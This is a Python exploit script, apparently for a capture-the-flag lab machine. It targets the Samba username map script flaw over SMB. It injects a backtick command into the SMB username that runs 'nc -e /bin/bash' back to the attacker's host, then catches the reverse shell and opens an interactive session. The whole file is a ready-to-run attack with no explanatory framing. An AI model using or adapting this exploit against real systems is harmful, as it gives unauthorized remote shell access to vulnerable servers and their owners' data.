#!/usr/bin/python3

import sys
from pwn import *
from smb.SMBConnection import SMBConnection

lhost = "10.10.14.7"
lport = 443
RHOST = "10.10.10.3"


def handler(sig, frame):
    print(f"\n\u001b[1;31m[!] Exiting...\u001b[0m")
    sys.exit(1)


signal.signal(signal.SIGINT, handler)


def get_reverse_shell(p1, RHOST, lhost):
    try:
        p1.status(f"\u001b[1;34mAttempting to connect to {RHOST}\u001b[0m")
        time.sleep(1)

        rce = f"nc -e /bin/bash {lhost} 443"
        username = "/=`nohup " + rce + "`"
        password = ""
        my_name = ""
        remote_name = ""

        exploit = SMBConnection(username, password, my_name, remote_name)
        exploit.connect(RHOST, 445)

    except ConnectionError as e:
        log.failure(f"\u001b[1;31mAn error has occurred\u001b[0m")
        sys.exit(1)


if __name__ == '__main__':
    p1 = log.progress(f"\u001b[1;34mSMB Exploit")

    try:
        threading.Thread(target=get_reverse_shell, args=(p1, RHOST, lhost)).start()

    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        log.failure(f"\u001b[1;31mNo connection has been established\u001b[0m")
        sys.exit()

    else:
        p1.success(f"\u001b[1;34mSMB successfully exploited\u001b[0m")
        log.success(f"\u001b[1;34mA connection has been established\u001b[0m")
        time.sleep(1)

    shell.interactive()

